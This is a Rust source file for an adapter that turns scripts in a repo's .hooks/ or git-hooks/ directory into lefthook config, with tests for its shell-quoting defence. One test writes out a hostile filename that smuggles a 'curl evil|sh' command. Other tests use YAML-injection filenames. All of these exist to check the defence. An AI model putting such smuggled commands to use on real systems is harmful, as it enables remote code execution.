use serde_yaml::{Mapping, Value};
use std::fs;
#[cfg(unix)]
use std::os::unix::fs::PermissionsExt;
use std::path::Path;

use super::Adapter;

const HOOKS_DIR_NAMES: &[&str] = &[".hooks", "git-hooks"];

/// Adapter for conventional hooks directories in the repo root.
///
/// Detects `.hooks/` or `git-hooks/` (first match wins) and generates lefthook
/// commands for all scripts matching the hook name: the exact match
/// (e.g. `pre-commit`) plus any prefixed scripts (e.g. `pre-commit-checkstyle`).
///
/// `.git/hooks/` is intentionally excluded — it is git's internal mechanism and
/// tools like husky, pre-commit, and lefthook write there as an implementation
/// detail. Including it would risk double-executing hooks that are already
/// handled by dedicated adapters or by lhm itself.
pub struct HooksDirAdapter;

/// Return the first hooks directory name that exists as a directory under `root`.
fn find_hooks_dir(root: &Path) -> Option<&'static str> {
    HOOKS_DIR_NAMES.iter().copied().find(|name| root.join(name).is_dir())
}

/// Check whether a directory entry is executable (has any execute bit on Unix).
#[cfg(unix)]
fn is_executable(entry: &fs::DirEntry) -> bool {
    entry
        .metadata()
        .map(|m| m.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

#[cfg(not(unix))]
fn is_executable(_entry: &fs::DirEntry) -> bool {
    true
}

/// POSIX single-quote `s` so it survives the shell as a single literal word.
///
/// Script paths flow into the lefthook `run:` field, which lefthook hands to
/// `sh -c`. A repo controls its own filenames, and Unix filenames may contain
/// spaces, `;`, `|`, `$()`, backticks, etc. Single-quoting makes the whole path
/// one word: the only metacharacter that matters inside single quotes is `'`
/// itself, which we escape as `'\''` (close, escaped quote, reopen).
fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// Collect sorted filenames from `hooks_dir` that match `hook_name` exactly
/// or start with `{hook_name}-`.
fn matching_scripts(hooks_dir: &Path, hook_name: &str) -> Vec<String> {
    let prefix = format!("{hook_name}-");
    let Ok(entries) = fs::read_dir(hooks_dir) else {
        return Vec::new();
    };
    let mut names: Vec<String> = entries
        .filter_map(|e| e.ok())
        .filter(|e| e.path().is_file())
        .filter(is_executable)
        .filter_map(|e| {
            let name = e.file_name().to_string_lossy().into_owned();
            (name == hook_name || name.starts_with(&prefix)).then_some(name)
        })
        .collect();
    names.sort();
    names
}

impl Adapter for HooksDirAdapter {
    fn name(&self) -> &str {
        "hooks-dir"
    }

    fn detect(&self, root: &Path) -> bool {
        find_hooks_dir(root).is_some()
    }

    fn generate_config(&self, root: &Path, hook_name: &str) -> Option<Value> {
        let dir_name = find_hooks_dir(root)?;
        let hooks_dir = root.join(dir_name);
        let scripts = matching_scripts(&hooks_dir, hook_name);
        if scripts.is_empty() {
            return None;
        }

        // Build the lefthook config as a serde_yaml value directly rather than
        // formatting YAML text and re-parsing it. The library handles all YAML
        // quoting, and the script path is shell-quoted, so attacker-influenced
        // filenames can reach neither the YAML structure nor the shell as syntax.
        let mut commands = Mapping::new();
        for script in &scripts {
            let cmd_name = if script == hook_name {
                "hooks-dir".to_string()
            } else {
                let suffix = &script[hook_name.len() + 1..];
                format!("hooks-dir-{suffix}")
            };
            let run = format!("{} {{0}}", shell_quote(&format!("{dir_name}/{script}")));
            let mut cmd = Mapping::new();
            cmd.insert(Value::from("run"), Value::from(run));
            commands.insert(Value::from(cmd_name), Value::Mapping(cmd));
        }

        let mut hook = Mapping::new();
        hook.insert(Value::from("commands"), Value::Mapping(commands));

        let mut config = Mapping::new();
        config.insert(Value::from(hook_name), Value::Mapping(hook));
        Some(Value::Mapping(config))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    #[cfg(unix)]
    use std::os::unix::fs::PermissionsExt;
    #[cfg(unix)]
    use std::os::unix::fs::symlink;

    fn adapter() -> HooksDirAdapter {
        HooksDirAdapter
    }

    /// Write a hook script and mark it executable (on Unix).
    fn write_executable(path: &std::path::Path, content: &str) {
        fs::write(path, content).unwrap();
        #[cfg(unix)]
        fs::set_permissions(path, fs::Permissions::from_mode(0o755)).unwrap();
    }

    /// Extract the `run:` string for a given command name from a generated config.
    fn run_of<'a>(config: &'a Value, hook_name: &str, cmd_name: &str) -> &'a str {
        config[hook_name]["commands"][cmd_name]["run"]
            .as_str()
            .expect("run is a string")
    }

    #[test]
    fn test_detect_with_dot_hooks() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join(".hooks")).unwrap();
        assert!(adapter().detect(dir.path()));
    }

    #[test]
    fn test_detect_with_git_hooks() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("git-hooks")).unwrap();
        assert!(adapter().detect(dir.path()));
    }

    #[test]
    fn test_detect_ignores_dot_git_hooks() {
        let dir = tempfile::tempdir().unwrap();
        let hooks = dir.path().join(".git/hooks");
        fs::create_dir_all(&hooks).unwrap();
        fs::write(hooks.join("pre-commit"), "#!/bin/sh\n").unwrap();
        assert!(!adapter().detect(dir.path()));
    }

    #[test]
    fn test_detect_without_hooks_dir() {
        let dir = tempfile::tempdir().unwrap();
        assert!(!adapter().detect(dir.path()));
    }

    #[test]
    fn test_detect_file_not_dir() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join(".hooks"), "not a directory").unwrap();
        assert!(!adapter().detect(dir.path()));
    }

    #[test]
    fn test_dot_hooks_takes_priority_over_git_hooks() {
        let dir = tempfile::tempdir().unwrap();
        let dot_hooks = dir.path().join(".hooks");
        let git_hooks = dir.path().join("git-hooks");
        fs::create_dir_all(&dot_hooks).unwrap();
        fs::create_dir_all(&git_hooks).unwrap();
        write_executable(&dot_hooks.join("pre-commit"), "#!/bin/sh\n");
        write_executable(&git_hooks.join("pre-commit"), "#!/bin/sh\n");

        let config = adapter().generate_config(dir.path(), "pre-commit").unwrap();
        assert_eq!(run_of(&config, "pre-commit", "hooks-dir"), "'.hooks/pre-commit' {0}");
    }

    #[test]
    fn test_generate_config_with_hook_script() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        write_executable(&hooks_dir.join("pre-commit"), "#!/bin/sh\necho hi\n");

        let config = adapter().generate_config(dir.path(), "pre-commit").unwrap();
        // path is shell-quoted; git args are forwarded via the unquoted {0}.
        assert_eq!(run_of(&config, "pre-commit", "hooks-dir"), "'.hooks/pre-commit' {0}");
    }

    #[test]
    fn test_generate_config_git_hooks_dir() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join("git-hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        write_executable(&hooks_dir.join("pre-commit"), "#!/bin/sh\necho hi\n");

        let config = adapter().generate_config(dir.path(), "pre-commit").unwrap();
        assert_eq!(run_of(&config, "pre-commit", "hooks-dir"), "'git-hooks/pre-commit' {0}");
    }

    #[test]
    fn test_generate_config_without_hook_script() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".hooks");
        fs::create_dir_all(&hooks_dir).unwrap();

        assert!(adapter().generate_config(dir.path(), "pre-commit").is_none());
    }

    #[test]
    fn test_generate_config_different_hooks() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        write_executable(&hooks_dir.join("pre-push"), "#!/bin/sh\necho push\n");
        write_executable(&hooks_dir.join("commit-msg"), "#!/bin/sh\necho msg\n");

        let push_config = adapter().generate_config(dir.path(), "pre-push").unwrap();
        assert_eq!(run_of(&push_config, "pre-push", "hooks-dir"), "'.hooks/pre-push' {0}");

        let msg_config = adapter().generate_config(dir.path(), "commit-msg").unwrap();
        assert_eq!(
            run_of(&msg_config, "commit-msg", "hooks-dir"),
            "'.hooks/commit-msg' {0}"
        );

        assert!(adapter().generate_config(dir.path(), "pre-commit").is_none());
    }

    #[test]
    fn test_generate_config_with_prefixed_scripts() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        write_executable(&hooks_dir.join("pre-commit"), "#!/bin/sh\n");
        write_executable(&hooks_dir.join("pre-commit-checkstyle"), "#!/bin/sh\n");
        write_executable(&hooks_dir.join("pre-commit-detekt"), "#!/bin/sh\n");
        // Should NOT be picked up for pre-commit
        write_executable(&hooks_dir.join("pre-push"), "#!/bin/sh\n");
        write_executable(&hooks_dir.join("pre-push-detekt"), "#!/bin/sh\n");

        let config = adapter().generate_config(dir.path(), "pre-commit").unwrap();
        let commands = config["pre-commit"]["commands"].as_mapping().unwrap();
        assert!(commands.contains_key(Value::from("hooks-dir")), "has exact match cmd");
        assert_eq!(
            run_of(&config, "pre-commit", "hooks-dir-checkstyle"),
            "'.hooks/pre-commit-checkstyle' {0}"
        );
        assert_eq!(
            run_of(&config, "pre-commit", "hooks-dir-detekt"),
            "'.hooks/pre-commit-detekt' {0}"
        );
        assert!(!commands.keys().any(|k| k.as_str().unwrap_or("").contains("pre-push")));
    }

    #[test]
    fn test_generate_config_prefixed_only_no_exact_match() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        write_executable(&hooks_dir.join("pre-commit-ktlint"), "#!/bin/sh\n");

        let config = adapter().generate_config(dir.path(), "pre-commit").unwrap();
        let commands = config["pre-commit"]["commands"].as_mapping().unwrap();
        assert!(!commands.contains_key(Value::from("hooks-dir")), "no exact match cmd");
        assert_eq!(
            run_of(&config, "pre-commit", "hooks-dir-ktlint"),
            "'.hooks/pre-commit-ktlint' {0}"
        );
    }

    #[test]
    fn test_generate_config_prefixed_scripts_in_git_hooks() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join("git-hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        write_executable(&hooks_dir.join("pre-push"), "#!/bin/sh\n");
        write_executable(&hooks_dir.join("pre-push-detekt"), "#!/bin/sh\n");

        let config = adapter().generate_config(dir.path(), "pre-push").unwrap();
        assert_eq!(run_of(&config, "pre-push", "hooks-dir"), "'git-hooks/pre-push' {0}");
        assert_eq!(
            run_of(&config, "pre-push", "hooks-dir-detekt"),
            "'git-hooks/pre-push-detekt' {0}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn test_dot_hooks_follows_symlinks() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".hooks");
        fs::create_dir_all(&hooks_dir).unwrap();

        let target = dir.path().join("shared-hook");
        write_executable(&target, "#!/bin/sh\necho hi\n");
        symlink(&target, hooks_dir.join("pre-commit")).unwrap();

        let config = adapter().generate_config(dir.path(), "pre-commit").unwrap();
        assert_eq!(run_of(&config, "pre-commit", "hooks-dir"), "'.hooks/pre-commit' {0}");
    }

    #[test]
    fn test_matching_scripts_sorted() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        write_executable(&hooks_dir.join("pre-commit-zzz"), "#!/bin/sh\n");
        write_executable(&hooks_dir.join("pre-commit-aaa"), "#!/bin/sh\n");
        write_executable(&hooks_dir.join("pre-commit"), "#!/bin/sh\n");

        let scripts = matching_scripts(&hooks_dir, "pre-commit");
        assert_eq!(scripts, vec!["pre-commit", "pre-commit-aaa", "pre-commit-zzz"]);
    }

    #[test]
    fn test_matching_scripts_ignores_directories() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        write_executable(&hooks_dir.join("pre-commit"), "#!/bin/sh\n");
        fs::create_dir_all(hooks_dir.join("pre-commit-subdir")).unwrap();

        let scripts = matching_scripts(&hooks_dir, "pre-commit");
        assert_eq!(scripts, vec!["pre-commit"]);
    }

    #[cfg(unix)]
    #[test]
    fn test_matching_scripts_ignores_non_executable() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        write_executable(&hooks_dir.join("pre-commit"), "#!/bin/sh\n");
        // Non-executable file should be ignored
        fs::write(hooks_dir.join("pre-commit-noexec"), "#!/bin/sh\n").unwrap();

        let scripts = matching_scripts(&hooks_dir, "pre-commit");
        assert_eq!(scripts, vec!["pre-commit"]);
    }

    #[cfg(unix)]
    #[test]
    fn test_generate_config_skips_non_executable_hooks() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        // Only non-executable files — should produce no config
        fs::write(hooks_dir.join("post-checkout"), "#!/bin/sh\n").unwrap();

        assert!(adapter().generate_config(dir.path(), "post-checkout").is_none());
    }

    #[test]
    fn test_shell_quote() {
        assert_eq!(shell_quote("pre-commit"), "'pre-commit'");
        assert_eq!(shell_quote(".hooks/pre-commit"), "'.hooks/pre-commit'");
        assert_eq!(shell_quote("a;b|c$(d)`e`"), "'a;b|c$(d)`e`'");
        // a single quote in the name is escaped as '\''
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
    }

    #[cfg(unix)]
    #[test]
    fn test_generate_config_neutralizes_shell_metacharacters_in_filename() {
        // The payload lives in the *filename*, not the script contents. The
        // script is still picked up, but the path is single-quoted so `sh -c`
        // treats it as one literal word — the `;curl|sh` cannot run.
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        let evil = "pre-commit-x;curl evil|sh";
        write_executable(&hooks_dir.join(evil), "#!/bin/sh\n");

        let config = adapter().generate_config(dir.path(), "pre-commit").unwrap();
        let run = run_of(&config, "pre-commit", "hooks-dir-x;curl evil|sh");
        assert_eq!(run, "'.hooks/pre-commit-x;curl evil|sh' {0}");
    }

    #[cfg(unix)]
    #[test]
    fn test_serialized_yaml_round_trips_dangerous_filename() {
        // lefthook reads the *serialized* config, so guard the layer that
        // matters: a filename with YAML-significant bytes (`:`, `#`, newline)
        // must serialize and re-parse to the exact same run string, with no
        // structural injection. This also catches any future regression back
        // to formatting YAML text instead of building the value directly.
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        let nasty = "pre-commit-a: b #\nc";
        write_executable(&hooks_dir.join(nasty), "#!/bin/sh\n");

        let config = adapter().generate_config(dir.path(), "pre-commit").unwrap();
        let serialized = serde_yaml::to_string(&config).unwrap();
        let reparsed: Value = serde_yaml::from_str(&serialized).unwrap();
        assert_eq!(config, reparsed, "survives a YAML serialize/parse round-trip");
        assert_eq!(
            run_of(&reparsed, "pre-commit", "hooks-dir-a: b #\nc"),
            "'.hooks/pre-commit-a: b #\nc' {0}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn test_generate_config_escapes_single_quote_in_filename() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        write_executable(&hooks_dir.join("pre-commit-it's"), "#!/bin/sh\n");

        let config = adapter().generate_config(dir.path(), "pre-commit").unwrap();
        // the embedded `'` is escaped as `'\''`, keeping the path one shell word.
        assert_eq!(
            run_of(&config, "pre-commit", "hooks-dir-it's"),
            r"'.hooks/pre-commit-it'\''s' {0}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn test_generate_config_quotes_dash_prefixed_filename() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        write_executable(&hooks_dir.join("pre-commit--rf"), "#!/bin/sh\n");

        let config = adapter().generate_config(dir.path(), "pre-commit").unwrap();
        assert_eq!(
            run_of(&config, "pre-commit", "hooks-dir--rf"),
            "'.hooks/pre-commit--rf' {0}"
        );
    }
}
